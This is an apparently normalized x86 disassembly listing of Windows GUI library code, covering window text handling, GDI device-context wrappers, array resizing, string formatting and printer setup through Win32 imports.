push ebx
call [ SetWindowTextW@IAT ]
push eax
lea eax [ ebp - 0x204 ]
push eax
push ebx
call [ GetWindowTextW@IAT ]
cmp eax edi
jne r-xdata
push esi
lea eax [ ebp - 0x204 ]
push eax
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_414a33
leave
retn 0x8
sub_412d07
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_40a7dd
pop esi
pop ebp
retn 0x4
push eax
call [ DeleteObject@IAT ]
and [ esi ] 0x0
sub_412d2e
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
pop edi
pop ebp
retn 0x4
push esi
push edi
call [ GlobalFlags@IAT ]
mov esi eax
and esi 0xff
je r-xdata
push edi
call [ GlobalFree@IAT ]
pop esi
push edi
dec esi
call [ GlobalUnlock@IAT ]
test esi esi
jne r-xdata
sub_412d66
mov edi edi
push ebp
mov ebp esp
push esi
call sub_40b4c3
mov esi eax
test esi esi
je r-xdata
call sub_40a7a5
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call sub_417fca
pop ecx
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + 0x4 ]
cmp eax edx
ja r-xdata
sub eax ecx
sub eax 0x4
push eax
push [ esi + 0xc ]
call sub_418123
pop ecx
push [ esi + 0xc ]
call sub_415093
and [ esi + 0xc ] 0x0
jmp r-xdata
pop ecx
xor eax eax
inc eax
pop esi
pop ebp
retn
sub_412db9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call [ ClientToScreen@IAT ]
mov edi [ GetWindow@IAT ]
push 0x5
push [ ebp + 0x8 ]
jmp r-xdata
call edi
mov esi eax
test esi esi
jne r-xdata
push esi
call [ GetDlgCtrlID@IAT ]
cmp eax 0xffff
je r-xdata
pop edi
pop esi
leave
retn 0xc
push 0x2
push esi
push 0xfffffff0
push esi
call [ GetWindowLongW@IAT ]
test eax 0x10000000
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call [ GetWindowRect@IAT ]
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push eax
call [ PtInRect@IAT ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
sub_412e5c
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
mov esi ecx
jge r-xdata
mov eax [ ebp + 0xc ]
cmp eax ebx
jl r-xdata
call sub_40a7dd
cmp edi ebx
jne r-xdata
mov [ esi + 0x10 ] eax
mov ecx [ esi + 0x4 ]
cmp ecx ebx
jne r-xdata
push [ esi + 0x4 ]
call sub_40a5fb
pop ecx
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] ebx
jmp r-xdata
mov ebx [ esi + 0xc ]
cmp edi ebx
jg r-xdata
cmp edi 0xffffffff
ja r-xdata
mov [ esi + 0x4 ] ebx
mov eax [ esi + 0x10 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
cmp edi eax
jle r-xdata
push edi
call sub_40a5cc
push edi
push ebx
push eax
mov [ esi + 0x4 ] eax
call sub_415f60
add esp 0x10
mov [ esi + 0xc ] edi
jmp r-xdata
add eax ebx
cmp edi eax
mov [ ebp + 0x8 ] eax
jl r-xdata
mov eax [ esi + 0x8 ]
cdq
and edx 0x7
add eax edx
sar eax 0x3
cmp eax 0x4
jl r-xdata
mov [ esi + 0x8 ] edi
jmp r-xdata
mov edx edi
sub edx eax
push edx
add eax ecx
push 0x0
push eax
call sub_415f60
add esp 0xc
cmp [ ebp + 0x8 ] ebx
jl r-xdata
mov [ ebp + 0x8 ] edi
push 0x4
pop eax
mov ecx 0x400
cmp eax ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0x8 ]
call sub_40a5cc
push [ esi + 0x8 ]
mov ebx eax
push [ esi + 0x4 ]
push [ ebp + 0x8 ]
push ebx
call sub_40c024
mov eax [ esi + 0x8 ]
mov ecx edi
sub ecx eax
push ecx
add eax ebx
push 0x0
push eax
call sub_415f60
push [ esi + 0x4 ]
call sub_40a5fb
mov eax [ ebp + 0x8 ]
add esp 0x24
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] eax
cmp eax 0x4
jge r-xdata
mov eax ecx
jmp r-xdata
sub_412f6e
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x18 ]
not eax
push edi
test al 0x1
je r-xdata
call sub_40d1f8
push 0xffffffff
push eax
mov ecx esi
call sub_412e5c
mov edi [ esi + 0x8 ]
mov esi [ esi + 0x4 ]
test edi edi
jbe r-xdata
push [ esi + 0x8 ]
call sub_40d1c7
mov edi [ esi + 0x8 ]
mov ebx [ esi + 0x4 ]
test edi edi
jbe r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov ebx 0x7fffffff
cmp edi ebx
jae r-xdata
mov esi 0x7fffffff
cmp edi esi
jae r-xdata
mov ecx [ ebp + 0x8 ]
push ebx
push esi
call sub_40d269
add esi ebx
sub edi ebx
jne r-xdata
mov ebx edi
mov ecx [ ebp + 0x8 ]
push esi
push ebx
call sub_40d100
add ebx esi
sub edi esi
jne r-xdata
mov esi edi
jmp r-xdata
sub_413004
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_412e4c
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40a5fb
pop ecx
sub_413025
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
call sub_40a7dd
and [ ebp + 0xc ] 0x0
cmp [ edi ] 0x0
mov esi edi
je r-xdata
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov ebx edi
call sub_40b495
cmp [ edi ] 0x0
mov esi eax
je r-xdata
cmp [ esi ] 0x25
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub esi [ ecx ]
sar esi 0x1
push esi
call sub_40c0cd
pop edi
pop esi
pop ebx
leave
retn 0x10
movzx ecx [ ebx ]
cmp cx 0x25
jne r-xdata
inc esi
inc esi
movzx eax [ esi + 0x2 ]
cmp ax 0x31
jb r-xdata
mov [ esi ] cx
inc esi
inc esi
inc ebx
inc ebx
movzx eax [ ebx + 0x2 ]
cmp ax 0x31
jb r-xdata
cmp ax 0x41
jb r-xdata
cmp ax 0x39
jbe r-xdata
cmp ax 0x41
jb r-xdata
cmp ax 0x39
jbe r-xdata
cmp ax 0x5a
ja r-xdata
movzx eax ax
sub eax 0x31
cmp ax 0x5a
ja r-xdata
movzx eax ax
sub eax 0x31
cmp ax 0x39
jbe r-xdata
inc [ ebp + 0xc ]
mov eax [ ebx + eax * 4 ]
test eax eax
je r-xdata
cmp ax 0x39
jbe r-xdata
mov ecx [ ebp + 0x10 ]
lea edi [ ecx + eax * 4 ]
mov eax [ edi ]
test eax eax
je r-xdata
push 0x3f
pop eax
mov [ esi ] ax
inc esi
inc esi
jmp r-xdata
movzx eax ax
sub eax 0x38
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push eax
call [ lstrlenW@IAT ]
add [ ebp + 0xc ] eax
jmp r-xdata
movzx eax ax
sub eax 0x38
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
push eax
call [ lstrlenW@IAT ]
push [ edi ]
mov ebx eax
mov eax [ ebp + 0xc ]
inc eax
push eax
push esi
call sub_40cbfa
add esp 0xc
sub [ ebp + 0xc ] ebx
lea esi [ esi + ebx * 2 ]
mov ebx [ ebp - 0x4 ]
jmp r-xdata
dec [ ebp + 0xc ]
add esi 0x4
cmp eax [ ebp + 0x14 ]
jge r-xdata
add ebx 0x4
cmp eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] ebx
jl r-xdata
sub_413168
push 0x4
mov eax sub_425b08
call sub_415bc0
lea ecx [ ebp - 0x10 ]
call sub_40b45e
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_40b6c0
test eax eax
jne r-xdata
push [ ebp + 0x14 ]
mov esi [ ebp - 0x10 ]
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
call sub_413025
lea ecx [ esi - 0x10 ]
mov ecx [ ebp - 0x10 ]
add ecx 0xfffffff0
jmp r-xdata
call sub_40b038
call sub_415c98
retn 0x10
sub_4131d3
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jae r-xdata
mov edx [ ebp + 0xc ]
cmp edx 0x1
ja r-xdata
push 0x4
pop ecx
and [ eax + 0xc ] 0x0
and [ eax + 0x8 ] 0x0
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
pop ebp
retn 0x8
push 0x40
pop edx
sub_41321d
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov eax [ esi + 0xc ]
mov ecx [ eax ]
mov [ esi + 0xc ] ecx
pop esi
retn
push [ esi ]
lea eax [ esi + 0x8 ]
push [ esi + 0x4 ]
push eax
call sub_40cc18
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add eax 0x4
dec ecx
imul edx ecx
add eax edx
jmp r-xdata
test ecx ecx
jge r-xdata
mov edx [ esi + 0xc ]
mov [ eax ] edx
mov [ esi + 0xc ] eax
dec ecx
sub eax [ esi ]
sub_4132ac
push 0x0
mov eax sub_425ee0
call sub_415bc0
call sub_40bc5d
mov esi eax
cmp [ esi + 0x18 ] 0x0
jne r-xdata
mov eax [ esi + 0x18 ]
call sub_415c98
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push sub_412d66
call sub_40a5b5
push 0x60
mov ebx eax
call sub_40a5cc
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x1
push 0x4
push sub_413265
push sub_413292
push r--data
call sub_40da55
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x18 ] eax
call sub_40a5b5
sub_413334
mov edi edi
push ebp
mov ebp esp
push 0x0
call sub_4132ac
mov ecx eax
xor eax eax
test ecx ecx
je r-xdata
pop ebp
retn 0x4
add ecx 0x1c
pop ebp
jmp sub_40c3cf
sub_413355
mov edi edi
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
and [ esi + 0x4 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_4132ac
test eax eax
je r-xdata
push [ esi + 0x4 ]
lea ecx [ eax + 0x1c ]
call sub_40c43d
sub_413397
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_413381
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40a5fb
pop ecx
sub_4133e2
lea ecx [ ebp - 0x418 ]
call sub_40b45e
mov esi [ ebp - 0x41c ]
mov eax [ esi ]
xor edi edi
push edi
push 0x200
lea ecx [ ebp - 0x414 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call [ eax + 0xc ]
test eax eax
je r-xdata
push 0x6d
push r--data
push r--data
lea eax [ ebp - 0x418 ]
push r--data
push eax
call sub_40cb1f
add esp 0x14
lea eax [ ebp - 0x414 ]
push eax
push 0x6d
push r--data
push r--data
lea eax [ ebp - 0x418 ]
push r--data
push eax
call sub_40cb1f
add esp 0x18
jmp r-xdata
push edi
push edi
mov edi [ ebp - 0x418 ]
push edi
call sub_40bfa2
lea ecx [ edi - 0x10 ]
mov [ ebp - 0x4 ] 0x1
call sub_40b038
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x4 ]
mov eax r-xdata
retn
sub_413483
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_4133be
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40a5fb
pop ecx
sub_4134cc
mov edi edi
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
xor ebx ebx
push edi
mov edi [ SaveDC@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
push eax
call edi
mov ebx eax
pop edi
pop esi
mov eax ebx
pop ebx
retn
push eax
call edi
test eax eax
je r-xdata
or ebx 0xffffffff
sub_4134ff
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
xor eax eax
inc eax
push edi
mov edi [ RestoreDC@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ ebp + 0x8 ]
push ecx
call edi
pop edi
pop esi
pop ebp
retn 0x4
test eax eax
je r-xdata
xor eax eax
push [ ebp + 0x8 ]
push esi
call edi
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
sub_413541
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
or eax 0xffffffff
push edi
mov edi [ SetBkColor@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ ebp + 0x8 ]
push ecx
call edi
pop edi
pop esi
pop ebp
retn 0x4
push [ ebp + 0x8 ]
push esi
call edi
sub_413574
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
or eax 0xffffffff
push edi
mov edi [ SetTextColor@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ ebp + 0x8 ]
push ecx
call edi
pop edi
pop esi
pop ebp
retn 0x4
push [ ebp + 0x8 ]
push esi
call edi
sub_4135a7
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
xor eax eax
push edi
mov edi [ SetMapMode@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ ebp + 0x8 ]
push ecx
call edi
pop edi
pop esi
pop ebp
retn 0x4
push [ ebp + 0x8 ]
push esi
call edi
sub_413665
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x4 ]
call [ ExtTextOutW@IAT ]
pop ebp
retn 0x1c
sub_41368c
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ecx + 0x4 ]
call [ TabbedTextOutW@IAT ]
mov ecx [ ebp + 0x8 ]
movsx edx ax
shr eax 0x10
cwde
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebp
retn 0x20
sub_413703
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ecx + 0x4 ]
call [ GrayStringW@IAT ]
pop ebp
retn 0x20
mov eax [ eax + 0x4 ]
sub_413753
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
push edi
mov edi [ SetViewportOrgEx@IAT ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebp
retn 0xc
push [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_413792
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
push edi
mov edi [ OffsetViewportOrgEx@IAT ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebp
retn 0xc
push [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_4137d1
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
push edi
mov edi [ SetViewportExtEx@IAT ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebp
retn 0xc
push [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_413810
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
push edi
mov edi [ ScaleViewportExtEx@IAT ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebp
retn 0x14
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_41385b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
push edi
mov edi [ SetWindowExtEx@IAT ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebp
retn 0xc
push [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_41389a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
push edi
mov edi [ ScaleWindowExtEx@IAT ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebp
retn 0x14
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_4138e5
push 0x10
call sub_40a5cc
pop ecx
xor ecx ecx
cmp eax ecx
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
retn
sub_413920
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp eax ecx
je r-xdata
pop ebp
retn 0x4
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
sub_41395b
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40a5fb
pop ecx
sub_41397d
push 0x0
mov eax sub_425ee0
call sub_415bc0
call sub_40bc5d
mov esi eax
cmp [ esi + 0x1c ] 0x0
jne r-xdata
mov eax [ esi + 0x1c ]
call sub_415c98
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push sub_412d66
call sub_40a5b5
push 0x60
mov ebx eax
call sub_40a5cc
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x2
push 0x4
push sub_413265
push sub_413920
push r--data
call sub_40da55
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x1c ] eax
call sub_40a5b5
sub_413a05
mov edi edi
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x14 ]
and [ esi + 0x4 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_41397d
test eax eax
je r-xdata
push [ esi + 0x4 ]
lea ecx [ eax + 0x1c ]
call sub_40c43d
sub_413a51
push 0x0
mov eax sub_425ee0
call sub_415bc0
call sub_40bc5d
mov esi eax
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
call sub_415c98
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push sub_412d66
call sub_40a5b5
push 0x60
mov ebx eax
call sub_40a5cc
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x1
push 0x4
push sub_413265
push sub_413941
push r--data
call sub_40da55
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x20 ] eax
call sub_40a5b5
sub_413ad9
mov edi edi
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
and [ esi + 0x4 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_413a51
test eax eax
je r-xdata
push [ esi + 0x4 ]
lea ecx [ eax + 0x1c ]
call sub_40c43d
sub_413b1b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_413a38
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40a5fb
pop ecx
sub_413b3c
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
push [ ebp + 0x8 ]
mov esi ecx
call [ GetStockObject@IAT ]
mov ecx [ esi + 0x4 ]
mov edi [ SelectObject@IAT ]
mov ebx eax
xor eax eax
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push ebx
push ecx
call edi
push eax
call sub_413ac5
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push ebx
push esi
call edi
sub_413b7d
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
xor eax eax
push edi
mov edi [ SelectObject@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
push eax
call sub_413ac5
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
test ebx ebx
jne r-xdata
push eax
push ecx
call edi
mov eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
xor eax eax
jmp r-xdata
push eax
push esi
call edi
sub_413bc8
mov edi edi
push ebp
mov ebp esp
call sub_40c74b
test eax eax
je r-xdata
pop ebp
jmp [ PostQuitMessage@IAT ]
mov eax [ eax + 0x3c ]
test eax eax
je r-xdata
push 0x1
push 0x1
call eax
sub_413bea
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x74 ]
push edi
xor edi edi
cmp eax edi
je r-xdata
pop edi
pop esi
leave
retn 0x4
push ebx
mov ebx [ GlobalLock@IAT ]
push eax
call ebx
movzx ecx [ eax + 0x2 ]
push [ ebp + 0x8 ]
lea eax [ eax + ecx * 2 ]
push eax
call [ lstrcmpW@IAT ]
test eax eax
jne r-xdata
pop ebx
push edi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
call OpenPrinterW
test eax eax
je r-xdata
mov eax [ esi + 0x70 ]
cmp eax edi
je r-xdata
push edi
push edi
push edi
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
push edi
call DocumentPropertiesW
push eax
push 0x42
call [ GlobalAlloc@IAT ]
push eax
mov [ esi + 0x70 ] eax
call ebx
push 0x2
push edi
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
push edi
call DocumentPropertiesW
cmp eax 0x1
je r-xdata
push eax
call sub_412d2e
push [ ebp - 0x4 ]
call ClosePrinter
push [ esi + 0x70 ]
call sub_412d2e
mov [ esi + 0x70 ] edi
sub_413d0b
call sub_40bc2a
add eax 0x2c
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
retn
jmp r-xdata
call sub_40bc2a
cmp [ eax + 0x30 ] 0x0
jne r-xdata
retn
push esi
push 0x1
call sub_413cab
call sub_40bc2a
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
call sub_40bc2a
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov ecx [ esi + 0x20 ]
test ecx ecx
je r-xdata
pop esi
push 0x0
call sub_413bc8
call sub_412baa
test eax eax
je r-xdata
mov ecx [ esi + 0x20 ]
mov eax [ ecx ]
pop esi
jmp [ eax + 0x60 ]
sub_413d24
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jl r-xdata
call sub_40a7dd
cmp eax [ ecx + 0x8 ]
jge r-xdata
mov ecx [ ecx + 0x4 ]
lea eax [ ecx + eax * 4 ]
pop ebp
retn 0x4
sub_413d45
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jl r-xdata
call sub_40a7dd
cmp eax [ ecx + 0x8 ]
jge r-xdata
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax * 4 ]
pop ebp
retn 0x4
sub_413d91
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
jge r-xdata
mov eax [ ebp + 0xc ]
test eax eax
jl r-xdata
call sub_40a7dd
test ebx ebx
jne r-xdata
mov [ esi + 0x10 ] eax
mov ecx [ esi + 0x4 ]
push edi
test ecx ecx
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edi [ esi + 0xc ]
cmp ebx edi
jg r-xdata
mov edi [ esi + 0x10 ]
cmp ebx edi
jle r-xdata
and [ esi + 0xc ] 0x0
and [ esi + 0x8 ] 0x0
jmp r-xdata
push eax
call sub_40a5fb
and [ esi + 0x4 ] ebx
pop ecx
mov eax [ esi + 0x10 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
cmp ebx eax
jle r-xdata
mov eax edi
shl eax 0x2
push eax
call sub_40a5cc
mov ecx edi
shl ecx 0x2
push ecx
push 0x0
push eax
mov [ esi + 0x4 ] eax
call sub_415f60
add esp 0x10
mov [ esi + 0xc ] edi
jmp r-xdata
mov edi ebx
pop esi
pop ebx
pop ebp
retn 0x8
add eax edi
cmp ebx eax
mov [ ebp + 0x8 ] eax
jl r-xdata
mov eax [ esi + 0x8 ]
cdq
and edx 0x7
add eax edx
sar eax 0x3
cmp eax 0x4
jge r-xdata
mov [ esi + 0x8 ] ebx
pop edi
mov edx ebx
sub edx eax
shl edx 0x2
push edx
lea eax [ ecx + eax * 4 ]
push 0x0
push eax
call sub_415f60
add esp 0xc
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax edi
jl r-xdata
mov [ ebp + 0x8 ] ebx
mov ecx 0x400
cmp eax ecx
jle r-xdata
push 0x4
pop eax
jmp r-xdata
shl eax 0x2
push eax
call sub_40a5cc
mov edi eax
mov eax [ esi + 0x8 ]
shl eax 0x2
push eax
push [ esi + 0x4 ]
mov eax [ ebp + 0x8 ]
shl eax 0x2
push eax
push edi
call sub_40c024
mov eax [ esi + 0x8 ]
mov ecx ebx
sub ecx eax
shl ecx 0x2
push ecx
lea eax [ edi + eax * 4 ]
push 0x0
push eax
call sub_415f60
push [ esi + 0x4 ]
call sub_40a5fb
mov eax [ ebp + 0x8 ]
add esp 0x24
mov [ esi + 0x4 ] edi
mov [ esi + 0xc ] eax
mov eax ecx
sub_413ecc
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
test esi esi
jl r-xdata
call sub_40a7dd
mov ebx [ ebp + 0x10 ]
test ebx ebx
jle r-xdata
cmp esi [ edi + 0x8 ]
push 0xffffffff
jl r-xdata
mov esi [ edi + 0x8 ]
lea eax [ esi + ebx ]
push eax
call sub_413d91
mov ecx [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
sub esi ecx
mov edx esi
shl edx 0x2
mov esi ecx
push edx
mov [ ebp + 0x10 ] edx
shl esi 0x2
lea edx [ eax + esi ]
push edx
push [ ebp + 0x10 ]
add ecx ebx
lea eax [ eax + ecx * 4 ]
push eax
